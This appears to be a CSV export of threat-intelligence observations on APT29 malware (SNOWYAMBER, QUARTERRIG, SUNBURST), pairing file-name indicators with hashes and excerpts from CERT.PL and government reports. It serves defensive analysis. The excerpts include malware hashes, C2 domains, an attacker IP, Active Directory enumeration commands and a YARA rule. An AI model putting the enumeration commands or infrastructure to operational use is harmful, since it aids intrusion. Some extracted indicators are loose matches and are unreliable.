schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:4411d82b46648be0cfe8e47c867c6db9589b399db9da253556613316bcf6e6e8,observation--sha256:5af6429c4462bef5b0b6b725342e55645cd41316d58c70c2e66d68a29ed69dbf,file-name,example.php,example.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 10}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group At this point, the PTI Team had enough details to create a fingerprint profile for the subject host and started scanning the entire global IPv4 range using PRODAFT’s rapid scanning and fingerprinting technology for hosts with similar characteristics. After 12 hours, the PTI Team identified more than 200 hosts with the similarities mentioned above. After filtering the false positive results, the PTI Team found a host with IP 81.4.122.203 which was an exact match (Se",
1.0.0,actor--apt29,artifact--sha256:4411d82b46648be0cfe8e47c867c6db9589b399db9da253556613316bcf6e6e8,observation--sha256:90c024480514a8b1bfe3e91e1dad3d3485d1e392b30dcbecc1d4687d5d03942a,file-name,example.php,example.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 9}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3 Technical Analysis This section contains the TTP analysis of the SilverFish threat group including the C&C infrastructure, traffic distribution system, post exploitation steps, and malware detection sandbox (we named it as VictimTotal Sandbox, see Section 3.4). Domain IP Address AS Name databasegalore.com 5.252.177 .21 MivoCloud SRL At the beginning of our investigation into the SolarWinds hack, the PTI Team started analyzing the IOC data released by FireEye[ 8].",
1.0.0,actor--apt29,artifact--sha256:028e72bb268351c4b4e2a92bb92ec050f9eab21f23f756dd77c9b46726e67f81,observation--sha256:ebf04c86c3ed9cd3ab8c23e8f885fec7da60971a04f22caa7066f717073c6450,file-name,exe.pdf,exe.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:feaeb1c0b04fdd4a7fbf01a721f325b43aba190b3b4f227e9fba0fd7baa880f9,file-name,form.php,form.php,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA ThreatAnalysis InfrastructureAnalysis QuarterRigActivity:MarchtoMay2023ThroughanalyzingknownBlueBravoC2infrastructureandrelatedfileartifacts, weidentifiedmultipleadditional compromiseddomainsthat weassessarealmost certainlybeingusedbythethreat grouptodeliver QuarterRig. Oneof thedomainsweobserved, sylvio[.]com[.]br, wasalsopubliclyidentifiedbyCERT PLintheir analysisof theQuarterRigmalwarefamily. Domain RelatedSample Filename te-as[.]no 22b037f0a42579b45530bed196dd2b47",
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:aab0588e2ed1aee03b69f5cf6d9ec7a02efb9aa25c2b454df7b00c11f44d1a08,file-name,form.php,form.php,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure2: Comparisonof luredocumentsusedtodeliver QuarterRig Left: sylvio.com[.]br/form.php, Right: te-as[.]no)  Source:RecordedFutureandCERT PL) Whenestablishingtheinitial communicationwiththeC2server, theQuarterRigsamplesconstruct aJSONobject containingthefollowingfields: arandomlygenerated""session_id"" for identification, a""method"" fieldwithavalueof “reg” (indicatingaregistrationrequest), a""params"" fieldcontainingthevictim'susernameanddomain, andarandomlygenerated""sa",
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:72fd407bf98f297291bced2bbfc2215e067599ac2d53329bc71cecef60f62461,file-name,form.php,form.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/11 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db90067b84464e75548,
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:23a4c1eb8fd650c7b6bb08081e35a54ff16fa95c4a70799a8d3ba3fd2ca6e0ba,file-name,form.php,form.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 33/36 Network IoCs Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db9006,
1.0.0,actor--apt29,artifact--sha256:2e50211b2754f3691ca1ed527abdd2d5dc511a6a26c4d5fe805ec6fc8760e181,observation--sha256:f93eda2a6e900da06f770e9e4d62ccfb4fbf6c769200fd09913c1242e9f6ec38,file-name,hXaIk1314.pdf,hXaIk1314.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 5/11 Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979b128cbeddf4e70",
1.0.0,actor--apt29,artifact--sha256:2e50211b2754f3691ca1ed527abdd2d5dc511a6a26c4d5fe805ec6fc8760e181,observation--sha256:f598fbf3780a5e678cb51c10d861eb499bbc3fab4dc1ffe502a3456752ba36d2,file-name,hXaIk1314.pdf,hXaIk1314.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 21/24 Network IoCs Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979",
1.0.0,actor--apt29,artifact--sha256:b7f12abe586143c39db0fee9bc22d8b548b8e8cd8e43f9eda829f1eb909cf382,observation--sha256:7a19a9e08ec0315c2ea73dd62fd8517cf5ac71a6f1a1b63053d8a2bb3a105cd1,file-name,hXaIk1725.pdf,hXaIk1725.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 5/11 Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979b128cbeddf4e70",
1.0.0,actor--apt29,artifact--sha256:b7f12abe586143c39db0fee9bc22d8b548b8e8cd8e43f9eda829f1eb909cf382,observation--sha256:b9a7df4e2e9854bc622599cfc3a5e19eb82ddc1885d407edcfeec7241f5fa27a,file-name,hXaIk1725.pdf,hXaIk1725.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 21/24 Network IoCs Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979",
1.0.0,actor--apt29,artifact--sha256:7cbf0e4021364d02eef5a1d7f15d97fe5930d1c21ccbc41962236d275ecffc58,observation--sha256:0117c4da1c8109cd93c55a1ec085cf7129179454330e0b502f7f0bd3d490a3c6,file-name,hXaIk2508.pdf,hXaIk2508.pdf,candidate,2023-02-07T00:00:00Z,day,known,same-record,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 15/24 ""text"":{ ""content"":""<VictimID>"" }, ""type"":""text"" } ] } } } Where <EncFingerprint> is the previously mentioned encrypted fingerprint made from computername and username. Victim-specific API requests are sent to api.notion.com/v1/pages URL. 3. After that, SNOWYAMBER starts regular beaconing which is sent every 60 seconds and uses an HTTP PATCH request. Each updates the “emoji” field in the victim-specific page by incrementing it. { ""i",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:b0b3e6b9be926bc43432c104bd4423a9c2182c1d861648277f8afe5c6e615673,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 11/36 Reconstructed export hashing can be illustrated using the following script: def hash(x): s = 0 for x in x.encode(): s = ror(s, 13) + x return s Hashed export name found in the shellcode corresponds to “runnder_dll”. >>> hash(""runner_dll\x00"") 3137192214 3rd Stage – Intermediate Shellcode Loader – runner.dll Runner.dll is an intermediate step loader – it is similar in implementation and in functionality to hijacker.dll. Runnder.dll i",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:0c87b12e0167b896b5197ff9d81608b686e22e1147aa743c2886517aa3f22bc3,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 2/36 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:fd6ad82d6815298cac9e436113110c861320837274203a72d99c2a986e9e3491,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 30/36 YARA Rule A rule that can be used to scan for QUARTERRIG: rule apt29_QUARTERRIG { strings: $str_dll_name = ""hijacker.dll"" $str_import_name = ""VCRUNTIME140.dll"" // 48 8B 15 39 6A 00 00 mov rdx, cs:api_stuff.OpenThread // 48 8D 0D FA 68 00 00 lea rcx, api_stuff // 8B D8 mov ebx, eax // E8 3F 25 00 00 call load_api_addr // 44 8B C3 mov r8d, ebx // 33 D2 xor edx, edx // B9 FF FF 1F 00 mov ecx, 1FFFFFh // FF D0 call rax $op_resolve_and_c",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:7b526f3558acb60eba126bba16d05a9ee31c53b1778f472314efe28f9bdf60b4,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 7/36 Figure 4 - QUARTERRIG delivery and execution chain 1st Stage - Initial DLL – hijacker.dll The first stage of QUARTERRIG’s execution is a simple loader that shows multiple similarities to the first stage of HALFRIG including multiple direct code overlaps. Based on data found in DLL, its original name was hijacker.dll. The DLL starts off by decrypting a number of WinAPI function names. Encrypted strings are retrieved from the .data sec",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:0737bac77eef1be336c3c1522e157b765975570d0d8b4f044c1501022ae458c5,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 9/36 The following IDAPython script can be used to recreate the structure used to store module information and API names: name = ""api_load"" struct_id = idc.add_struc(0, name, 0) apis = [""module_base"",""kernel32.dll"",""VirtualAlloc"",""RtlCopyMemory"",""VirtualProtec t"",""VirtualFree"",""GetCurrentProcess"",""GetModuleHandleA"",""K32GetModuleInfo"",""Create FileA"",""CreateFileMapping"",""MapViewOfFile"",""CloseHandle"",""FreeLibrary"",""GetSystemD irectory"",""GetL",
1.0.0,actor--apt29,artifact--sha256:a553370dc3754310874380e5ca2b7221a143084a2c4b39e9a08190f0111e8041,observation--sha256:64c57a7211a01475261fc3e0005c55b07bb404c63ce1c30d9f3831a4a22576ad,file-name,httpd.conf,httpd.conf,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:6fd9b04e2567a4289c44478dd765e52cb2cc25ed988c2e308dec8cff83870040,observation--sha256:148b5b6d704e2d88f7727003400a81f22328ac66887db7eab2ceacd6ae02d37e,file-name,httpd.exe,httpd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:6d3e14e521a7af338a33b723d31ca76275ccad7331513256ae42672cf102c307,observation--sha256:c245faf0e7d92aaa4b4df60971a6b2266b9aa875300ab7a9de0ff5e3c114b78d,file-name,i.php,i.php,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 21/24 Network IoCs Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979",
